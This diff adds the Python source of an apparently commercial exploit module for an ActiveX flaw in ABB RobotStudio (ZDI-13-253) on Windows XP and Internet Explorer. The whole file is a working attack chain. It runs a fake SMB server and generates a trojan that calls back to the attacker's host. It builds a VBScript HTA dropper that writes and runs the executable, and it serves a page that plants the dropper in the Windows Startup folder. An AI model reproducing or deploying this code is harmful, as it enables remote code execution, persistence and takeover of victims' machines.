@@ -1,0 +1,277 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+
+import os
+import getopt
+import sys
+import socket
+import time
+import struct
+import threading
+import thread
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from threading import Thread
+from libs.canvasos import *
+from httpclientside import httpclientside
+
+import libs.newsmb.libsmb as libsmb
+
+
+# GUI info
+NAME = "ABB RobotStudio Tools CWGraph3D ActiveX Control Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote code execution vulnerability in ABB RobotStudio Tools CWGraph3D ActiveX"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "ABB"
+DOCUMENTATION["Date public"] = "2013.11.24"
+DOCUMENTATION["VersionsAffected"] = "RobotStudio Tools"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-13-253/"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [['Windows']]
+PROPERTY['VERSION'] = ['XP']
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 443 -v 12
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_cw3d -l 192.168.133.1 -d 443 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0:['Windows XP with IE'],
+}
+
+class smbServerThread(Thread):
+
+    def __init__(self, exploit):
+        Thread.__init__(self)
+        self.exploit = exploit
+        self.suicide = False
+
+        return
+
+    def run(self):
+        self.exploit.log("Starting SMB server")
+	SHARES = {u'D' : os.getcwd() + u'/3rdparty/D2SEC/exploits/d2sec_cw3d/d2'}
+	
+	self.exploit.smblock.acquire()
+        self.exploit.smbinit = 1
+        self.exploit.smblock.release()
+
+   	try:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		server = libsmb.SMBServer(s)
+		for k,v in SHARES.items():
+		    server.add_share(k, v)
+		
+		server.listen()
+		while server.accept() == True:
+		    pass
+
+	except Exception, ex:
+        	import traceback
+	        traceback.print_exc()
+        	server.shutdown()
+
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1
+        self.badstring = "\x00"
+        self.subesp = 0
+        self.name = NAME 
+	self.filecwxtmp = "d2_tmp.cwx"
+        self.filename = "index.html"
+        self.trojanname = "d2.exe"
+        self.filecwx = "d2.cwx"
+	self.vbsfile = "d"
+        self.threads = []
+        self.exploitpath = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_cw3d/d2/"
+        return
+
+    def file4hta(self, exename):
+		evilprog = "explorer.exe"
+		e = []
+		
+		for a in exename:
+			for b in a:
+				if b == "\r":
+				  d = "0d"
+				elif b == "\n":
+				  d = "0a"
+				elif b == "\0":
+				  d = "00"
+				else:
+				  c = hex(ord(b))
+				  d = c.replace("0x", "")
+				
+				if len(d) == 1:
+				  d = "0"+d
+				
+				e.append(d)
+		
+		i = 0
+		j = 0
+		l = len(e)
+		
+		hta = "function d()\n"
+		while 1:
+		  hta += " prog = prog & \""
+		
+		  while i != 24:
+		    hta += "%s," % e[j]
+		    if j == l-1:
+		      break
+		    i += 1
+		    j += 1
+		
+		  if j == l-1:
+		    hta = hta[:-1] + "\"\n\n"
+		    break
+		  hta += "\"\n"
+		  i = 0
+		
+		hta += " tmp = Split(prog, \",\")\n"	
+		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+		hta += " For i = 0 To UBound(tmp)\n"
+		hta += "   prog = Int(\"&H\" & tmp(i))\n"
+		hta += "   f.Write Chr(prog)\n"
+		hta += " Next\n\n"
+		hta += " f.Close\n"
+		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+		hta += " self.Close\n"		
+		hta += "End function\n"
+		hta += "d()\n"		
+		
+		return hta 
+
+    def maketrojan(self):    	
+	t_os = canvasos("Windows")
+	t_os.arch = "X86"    
+	self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os, http=True, ssl=self.useSSL)        
+	self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))   
+   
+	self.htafile = self.file4hta(self.mosdeftrojan)	
+	file(self.exploitpath + self.vbsfile, "wb").write(self.htafile)
+
+	tmp = file(self.exploitpath + self.filecwxtmp, "rb").read()
+	vbs = "<SCRIPT language=vbs src=\\\\" + self.callback.ip + "\\d\\" + self.vbsfile + "></SCRIPT>"
+	file(self.exploitpath + self.filecwx, "wb").write(tmp[:-(len(vbs))]+vbs)
+
+	self.setInfo("%s - done" % (NAME))
+	ret = len(self.mosdeftrojan) != 0  
+
+	return ret
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	document.getElementById("targetDiv").innerHTML = "<object classid='clsid:2AFA9F10-0B6A-11D2-A250-00A024D8324D' id='target'></object>";	
+			
+       	var src = "\\\\\\\\IPSRV\\\D\\\d2.cwx";
+	var dst = "C:\\\Documents and Settings\\\All Users\\\Start Menu\\\Programs\\\Startup\\\d2.hta";
+	target.ImportStyle(src);
+	target.ExportStyle(dst)   
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+	filedata = filedata.replace('IPSRV', self.callback.ip)
+	
+        return filedata
+
+    def makesploit(self, clientheader, clientbody):   
+        # Start fake SMB server
+        self.smblock = threading.Lock()
+        self.smbinit = 0
+        t = smbServerThread(self)
+        t.start()
+        self.threads += [t]
+        time.sleep(1)
+        self.smblock.acquire()
+
+        if self.smbinit != 1:
+            self.state = self.HALT
+            self.log("Could not listen on port 445. You should be running as root!")
+            return 0
+
+        self.smblock.release() 
+               
+        # Make trojan
+	self.maketrojan()
+
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        if clientheader.URL.count(self.filename):            
+            sploitstring = self.makefile()            
+            b.setBody(sploitstring)
+	elif clientheader.URL.count(self.vbsfile):            
+            sploitstring = self.htafile            
+            b.setBody(sploitstring)
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]    
+
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
